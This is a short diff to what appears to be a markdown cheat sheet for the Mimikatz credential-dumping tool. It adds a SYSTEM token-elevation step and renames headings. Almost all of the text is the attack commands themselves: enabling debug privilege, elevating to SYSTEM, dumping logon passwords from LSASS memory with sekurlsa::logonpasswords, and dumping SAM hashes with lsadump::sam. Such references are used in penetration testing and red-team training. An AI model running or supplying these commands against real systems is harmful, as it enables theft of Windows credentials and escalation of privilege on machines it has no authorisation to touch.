@@ -14,9 +14,14 @@ execute
 .\mimikatz.exe
 ```
 
-debug on
+Enabling SeDebugPrivilege
 ```
 privilege::debug
+```
+
+elevating to SYSTEM user privileges
+```
+token::elevate
 ```
 
 logonpasswords
@@ -24,7 +29,7 @@ logonpasswords
 sekurlsa::logonpasswords
 ```
 
-sam dump
+dump sam
 ```
 lsadump::sam
 ```
